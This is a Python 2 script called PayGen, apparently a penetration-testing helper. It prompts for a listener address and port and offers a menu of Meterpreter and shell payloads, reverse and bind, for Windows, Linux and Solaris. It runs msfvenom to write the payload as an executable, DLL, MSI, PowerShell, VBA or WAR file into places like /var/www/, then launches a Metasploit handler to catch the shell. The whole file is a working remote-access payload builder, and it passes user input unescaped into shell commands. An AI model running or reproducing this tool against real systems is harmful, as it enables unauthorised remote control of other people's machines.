# PayGen (www.hackwhackandsmack.com)
#
# Written by Ben Turner 2014
#

import io, time, commands, os, subprocess

try:
	inteth = 'eth0'
	inteth_ip = commands.getoutput("ip address show dev " + inteth).split()
	inteth_ip = inteth_ip[inteth_ip.index('inet') + 1].split('/')[0]

except:
	inteth_ip = '127.0.0.1'

outfile = {}
outfile['1']="/var/www/"
outfile['2']="/tmp/"
outfile['3']="/tftpboot/"
outfile['4']="/root/Desktop/"

menu = {}
menu['1']="windows/meterpreter/reverse_tcp"
menu['2']="windows/meterpreter/bind_tcp"
menu['3']="windows/meterpreter/reverse_https" 
menu['4']="windows/meterpreter/reverse_http"
menu['5']="windows/x64/meterpreter/reverse_tcp" 
menu['6']="windows/x64/shell/reverse_tcp"
menu['7']="windows/x64/shell/bind_tcp"
menu['8']="linux/x86/shell/reverse_tcp"
menu['9']="linux/x86/shell/bind_tcp"
menu['10']="linux/x64/shell/reverse_tcp"
menu['11']="linux/x64/shell/bind_tcp"
menu['12']="solaris/sparc/shell_bind_tcp"                   
menu['13']="solaris/sparc/shell_find_port"                    
menu['14']="solaris/sparc/shell_reverse_tcp"                  
menu['15']="solaris/x86/shell_bind_tcp"                       
menu['16']="solaris/x86/shell_find_port"                      
menu['17']="solaris/x86/shell_reverse_tcp"   

#more options here

lport='5555'
outputloc='/tmp/'
payloadformat='exe'

print ""
ipaddr = raw_input("\033[0;31mPlease enter LHOST IP Address [" + inteth_ip + "]: \033[0m") or inteth_ip
lport = raw_input("\033[0;31mPlease enter LPORT TCP Port [" + lport + "]: \033[0m") or lport
#outputloc = raw_input("\033[0;31mPlease enter Output location of Payload [" + outputloc + "]: \033[0m") or outputloc
print""
#print"Available output formats: Cs[H]arp, [P]erl, Rub[Y], [J]s, e[X]e, [D]ll, [V]BA, [W]ar, Pytho[N]"
print "aspx, dll, exe, msi, psh, vba, vbs, war"
payloadformat = raw_input("\033[0;31mPlease enter value for the Payload format [" + payloadformat + "]: \033[0m") or payloadformat
print ""

#option for encoding

payload = "windows/x64/meterpreter/reverse_tcp"
payselect = '5'

while True:
	outputoptions=outfile.keys()
	for entry in outputoptions:
		print entry, outfile[entry]

	print ""
	
	outputselection = raw_input("\033[0;32mPlease enter your output directory [" + outputloc + "]: \033[0m") or outputloc
	try:	
		outputloc = outfile[outputselection]
		break
	except:
		print "\033[0;31mError with output selection reverting back to default [" + outputloc + "]\n\033[0m"
		break
while True: 
	options=menu.keys()
	#options.sort()
	for entry in options: 
		print entry, menu[entry]

	print ""
		
	selection = raw_input("\033[0;32mPlease Select Payload [" + payselect + "]: \033[0m") or payselect
	#outputselection = raw_input("") or outputloc
	try:
		#outputloc = outfile[outputselection]
		paynum = int(selection)
		payload = menu[selection]
		break
	except:
		print "Unknown Option Selected" 
		exit()
print ""

if payloadformat == 'psh':
	outputname = 'payload.ps1'
elif payloadformat == 'aspx':
	outputname = 'Payload.aspx'
elif payloadformat == 'exe':
	outputname = 'Payload.exe'
elif payloadformat == 'dll':
	outputname = 'Payload.dll'
elif payloadformat == 'vbs':
	outputname = 'Payload.vbs'
elif payloadformat == 'war':
	outputname = 'Payload.war'
elif payloadformat == 'msi':
	outputname = 'Payload.msi'
elif payloadformat == 'vba':
        outputname = 'Payload.vba'
else:
	print "Unknown Output Format"
	exit()


with open(outputloc + outputname, "w") as outfile:
	subprocess.call('msfvenom -f ' + payloadformat + ' -p ' + payload + ' LHOST=' + ipaddr + ' LPORT=' + lport, shell=True, stdout=outfile)
time.sleep(2)
subprocess.call('msfcli multi/handler PAYLOAD=' + payload + ' LHOST=' + ipaddr + ' LPORT=' + lport + ' E', shell=True)

